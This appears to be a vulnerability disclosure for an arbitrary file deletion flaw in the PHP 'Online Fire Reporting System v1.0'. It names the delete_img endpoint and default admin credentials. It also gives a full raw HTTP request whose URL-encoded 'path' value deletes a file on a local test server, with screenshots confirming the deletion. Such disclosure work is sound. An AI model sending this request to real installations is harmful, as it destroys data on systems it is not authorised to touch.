# Online Fire Reporting System v1.0 by oretnom23 has Delete any file

vendors: https://www.sourcecodester.com/php/15346/online-fire-reporting-system-phpoop-free-source-code.html

Vulnerability File: /ofrs/classes/Master.php?f=delete_img

Vulnerability location: /ofrs/classes/Master.php?f=delete_img, path

The password for the backend login account is: admin/admin123

Payload:

Here we delete the shell.php file in the root directory

```sql
POST /ofrs/classes/Master.php?f=delete_img HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/ofrs/admin/?page=system_info
Content-Length: 62
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close

path=C%3A%2Fxampp%2Fhtdocs%2Fofrs%2Fshell.php
```

The file path needs to be encoded by url

![image](https://user-images.githubusercontent.com/54017627/170816538-edd5be5f-8a46-4b2e-be7b-8032e81be250.png)

Currently, when we do not send a request to delete the shell.php file, the shell.php file is still in the root directory of the website

![image](https://user-images.githubusercontent.com/54017627/170816553-08631f47-cbd6-412a-8025-0df39cab3668.png)

The response package shows that the deletion was successful. Let's go to the root directory to see if the shell.php file still exists.

![image](https://user-images.githubusercontent.com/54017627/170816564-0215187c-8bcc-46a6-83b9-5ecc26a0dbab.png)

By this time, shell.php has been deleted.

![image](https://user-images.githubusercontent.com/54017627/170816594-58dd1d0d-0ee0-4225-9c16-f67105f0055a.png)
